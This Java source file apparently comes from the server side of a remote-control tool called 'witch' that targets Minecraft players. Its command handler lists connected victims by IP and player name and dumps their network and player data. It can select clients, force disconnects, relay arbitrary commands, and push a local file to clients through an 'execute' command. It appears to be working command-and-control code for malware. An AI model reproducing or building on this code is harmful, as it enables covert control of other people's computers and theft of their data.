package me.soda.witch.server.server;

import com.google.gson.Gson;
import me.soda.witch.server.Main;
import me.soda.witch.shared.socket.messages.messages.DisconnectData;

import java.io.File;
import java.io.FileInputStream;

public class CommandHandler {
    private static final Gson GSON = new Gson();

    public static void handle(String in, Server server) {
        String[] msgArr = in.split(" ");
        if (msgArr.length > 0) {
            try {
                switch (msgArr[0]) {
                    case "stop" -> {
                        Main.inputStream.close();
                        server.stop();
                    }
                    case "conn" -> {
                        if (msgArr.length == 1) {
                            Server.log("----CONNECTIONS----");
                            server.getConnections().forEach(conn -> Server.log(String.format("IP: %s, ID: %s, Player:%s",
                                    server.clientMap.get(conn).ip,
                                    server.clientMap.get(conn).index, server.clientMap.get(conn).playerData.playerName)));
                        } else if (msgArr.length == 3) {
                            switch (msgArr[1]) {
                                case "net" -> server.getConnections().stream().filter(conn ->
                                                server.clientMap.get(conn).index == Integer.parseInt(msgArr[2]))
                                        .forEach(conn -> Server.log(String.format("ID: %s, Network info: %s ", msgArr[2],
                                                GSON.toJson(server.clientMap.get(conn).ip)
                                        )));
                                case "player" -> server.getConnections().stream().filter(conn ->
                                                server.clientMap.get(conn).index == Integer.parseInt(msgArr[2]))
                                        .forEach(conn -> Server.log(String.format("ID: %s, Player info: %s ", msgArr[2],
                                                GSON.toJson(server.clientMap.get(conn).playerData)
                                        )));
                                case "sel" -> {
                                    if (msgArr[2].equals("all")) {
                                        server.sendUtil.setAll(true);
                                        Server.log("Selected all clients!");
                                        break;
                                    }
                                    server.sendUtil.setConnCollection(server.getConnections().stream().filter(conn ->
                                                    server.clientMap.get(conn).index == Integer.parseInt(msgArr[2]))
                                            .toList());
                                    Server.log("Selected client!");
                                }
                                case "disconnect" -> {
                                    server.getConnections().stream().filter(conn ->
                                                    server.clientMap.get(conn).index == Integer.parseInt(msgArr[2]))
                                            .forEach(connection -> connection.close(DisconnectData.Reason.NO_RECONNECT));
                                    Server.log("Client " + msgArr[2] + " disconnected");
                                }
                                case "reconnect" -> {
                                    server.getConnections().stream().filter(conn ->
                                                    server.clientMap.get(conn).index == Integer.parseInt(msgArr[2]))
                                            .forEach(connection -> connection.close(DisconnectData.Reason.RECONNECT));
                                    Server.log("Client " + msgArr[2] + " reconnecting");
                                }
                            }
                        }
                    }
                    default -> {
                        if (msgArr.length >= 2) {
                            String command = in.substring(msgArr[0].length() + 1);
                            if (msgArr[0].equals("execute")) {
                                File file = new File(command);
                                try (FileInputStream is = new FileInputStream(file)) {
                                    server.sendUtil.trySendBytes(server, msgArr[0], is.readAllBytes());
                                }
                            }
                        } else {
                            server.sendUtil.trySendJson(server, msgArr[0]);
                        }
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
}
